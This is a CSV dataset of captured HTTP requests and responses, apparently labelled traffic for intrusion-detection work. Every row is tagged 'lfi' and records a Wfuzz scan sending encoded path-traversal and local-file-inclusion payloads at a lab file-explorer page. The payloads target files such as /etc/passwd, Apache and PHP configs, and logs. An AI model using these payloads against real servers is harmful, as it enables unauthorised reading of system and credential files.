attack_tag,dst_ip,dst_port,req_body,req_header_Accept,req_header_Content_Length,req_header_Content_Type,req_header_Host,req_header_User_Agent,req_method,req_url,res_body,res_header_Connection,res_header_Content_Length,res_header_Content_Type,res_header_Date,res_header_Response_Code,res_header_Server,src_ip,src_port
lfi,192.168.60.165,80,filename=0x2e0x2e%u2216boot.ini,*/*,31,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:15 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,42546
lfi,192.168.60.165,80,filename=/etc/httpd/conf.d/httpd.conf,*/*,37,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:12:55 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,42550
lfi,192.168.60.165,80,filename=0x2e0x2e%25c0%25afetc%25c0%25afissue,*/*,45,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:15 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,42558
lfi,192.168.60.165,80,filename=%c0.%c0.\%c0.%c0.\%c0.%c0.\%c0.%c0.\%c0.%c0.\windows\system32\drivers\etc\hosts,*/*,88,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:15 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,42560
lfi,192.168.60.165,80,filename=/usr/local/apache2/httpd.conf,*/*,38,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:12:56 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,42566
lfi,192.168.60.165,80,filename=/var/mail/www,*/*,22,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:12:56 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,42576
lfi,192.168.60.165,80,filename=%c0.%c0.%c1%pc%c0.%c0.%c1%pcwindows%c1%pcsystem32%c1%pcdrivers%c1%pcetc%c1%pchosts,*/*,91,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:16 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,42592
lfi,192.168.60.165,80,filename=/var/log/apache/access_log%00,*/*,38,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:12:56 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,42604
lfi,192.168.60.165,80,filename=/usr/local/etc/apache/conf/httpd.conf%00,*/*,49,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:12:57 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,42616
lfi,192.168.60.165,80,filename=%c0.%c0.%25c1%259c%c0.%c0.%25c1%259c%c0.%c0.%25c1%259c%c0.%c0.%25c1%259cboot.ini,*/*,89,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:16 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,42622
lfi,192.168.60.165,80,filename=%c0.%c0.%f0%80%80%af%c0.%c0.%f0%80%80%af%c0.%c0.%f0%80%80%af%c0.%c0.%f0%80%80%af%c0.%c0.%f0%80%80%afetc%f0%80%80%afpasswd,*/*,130,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:13:16 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,42636
lfi,192.168.60.165,80,filename=/var/log/exim/rejectlog%00,*/*,35,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:12:57 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,42640
lfi,192.168.60.165,80,filename=/usr/lib/php/php.ini,*/*,29,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:12:57 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,44938
lfi,192.168.60.165,80,filename=/usr/local/apache2/logs/access_log,*/*,43,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:12:57 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,44950
lfi,192.168.60.165,80,filename=\apache\log\access_log,*/*,31,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:12:57 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,44962
lfi,192.168.60.165,80,filename=\log\access.log,*/*,24,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:12:58 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,44978
lfi,192.168.60.165,80,filename=../../../../../proc/self/fd/8%00,*/*,41,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:12:58 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,44992
lfi,192.168.60.165,80,filename=/usr/local/php5/lib/php.ini,*/*,36,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:12:58 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,45000
lfi,192.168.60.165,80,filename=/apache\php\php.ini,*/*,28,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:12:58 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,45006
lfi,192.168.60.165,80,filename=/var/log/exim/rejectlog,*/*,32,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:12:58 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,45016
lfi,192.168.60.165,80,filename=../../../../../../../../../../../etc/security/user,*/*,59,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:12:58 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,45018
lfi,192.168.60.165,80,filename=../../../../../../../../../../../../../../../opt/lampp/logs/access_log,*/*,79,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:12:58 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,45024
lfi,192.168.60.165,80,filename=..%25c1%259c..%25c1%259c{FILE},*/*,39,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:12:59 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,45038
lfi,192.168.60.165,80,filename=..%5c..%5c{FILE},*/*,25,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:12:59 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,45042
lfi,192.168.60.165,80,filename=\../\../\../\../\../\../\../\../{FILE},*/*,47,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:12:59 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,45058
lfi,192.168.60.165,80,filename=..........................................................................\..\..\..\..\..\..\{FILE},*/*,108,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:12:59 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,45070
lfi,192.168.60.165,80,filename=%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216{FILE},*/*,69,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:12:59 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,45078
lfi,192.168.60.165,80,filename=./\/././\/././\/././\/././\/././\/././\/././\/./{FILE},*/*,63,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:12:59 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,45082
lfi,192.168.60.165,80,filename=./.././.././.././.././.././../{FILE},*/*,45,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",close,768,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:12:59 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,45092
